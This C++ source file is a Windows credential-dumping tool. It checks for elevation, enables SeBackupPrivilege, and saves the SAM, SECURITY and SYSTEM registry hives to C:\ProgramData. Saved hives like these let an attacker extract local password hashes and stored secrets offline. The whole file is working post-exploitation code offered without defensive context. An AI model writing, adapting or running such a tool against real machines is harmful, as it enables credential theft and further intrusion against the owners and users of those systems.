
#include <iostream>
#include <windows.h>

BOOL IsElevated() {
    BOOL fRet = FALSE;
    HANDLE hToken = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION Elevation = { 0 };
        DWORD cbSize = sizeof(TOKEN_ELEVATION);
        if (GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &cbSize)) {
            fRet = Elevation.TokenIsElevated;
        }
    }
    if (hToken) {
        CloseHandle(hToken);
    }
    return fRet;
}

BOOL SetBackupPrivilege() {
    HANDLE hToken = NULL;
    TOKEN_PRIVILEGES TokenPrivileges = { 0 };

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken)) {
        return FALSE;
    }

    TokenPrivileges.PrivilegeCount = 1;
    TokenPrivileges.Privileges[0].Attributes = TRUE ? SE_PRIVILEGE_ENABLED : 0;

    LPCWSTR lpwPriv = L"SeBackupPrivilege";
    if (!LookupPrivilegeValueW(NULL, lpwPriv, &TokenPrivileges.Privileges[0].Luid)) {
        CloseHandle(hToken);
        return FALSE;
    }

    if (!AdjustTokenPrivileges(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
        CloseHandle(hToken);
        return FALSE;
    }

    CloseHandle(hToken);
    return TRUE;
}

void dump_reg()
{
    HKEY hKey = 0x0;

    DWORD file_exist;

    //dump sam
    LPCWSTR lpSubKey = L"SAM";
    LPCWSTR	lpFile = L"C:\\ProgramData\\sam.save"; 
    RegOpenKeyEx(HKEY_LOCAL_MACHINE, lpSubKey, 0, 0x20000, &hKey);
    file_exist = RegSaveKeyExW(hKey, lpFile, 0x0, 2);

    //Check file exist
    if (file_exist == 183) {
        DeleteFileW(lpFile);
        RegSaveKeyW(hKey, lpFile, 0x0);
    }
    RegCloseKey(hKey);

    hKey = 0x0;
    //dump security
    lpSubKey = L"SECURITY";
    lpFile = L"C:\\ProgramData\\security.save";
    RegOpenKeyEx(HKEY_LOCAL_MACHINE, lpSubKey, 0, 0x20000, &hKey);
    file_exist = RegSaveKeyExW(hKey, lpFile, 0x0, 2);

    //Check file exist
    if (file_exist == 183) {
        DeleteFileW(lpFile);
        RegSaveKeyW(hKey, lpFile, 0x0);
    }
    RegCloseKey(hKey);

    hKey = 0x0;
    //dump system
    lpSubKey = L"SYSTEM";
    lpFile = L"C:\\ProgramData\\system.save";
    RegOpenKeyEx(HKEY_LOCAL_MACHINE, lpSubKey, 0, 0x20000, &hKey);
    file_exist = RegSaveKeyExW(hKey, lpFile, 0x0, 2);

    //Check file exist
    if (file_exist == 183) {
        DeleteFileW(lpFile);
        RegSaveKeyW(hKey, lpFile, 0x0);
    }
    RegCloseKey(hKey);

}

int main()
{ 
    if (!IsElevated()) {
        std::cout << "[!] You need elevated privileges to run this tool!\n";
        exit(1);
    }

    SetBackupPrivilege();
    std::cout << "[+] SeBackupPrivilege has been successfully activated.\n";

    dump_reg();
    std::cout << "[+] Sam, System and Security dumped to C:\\ProgramData\\\n";
}

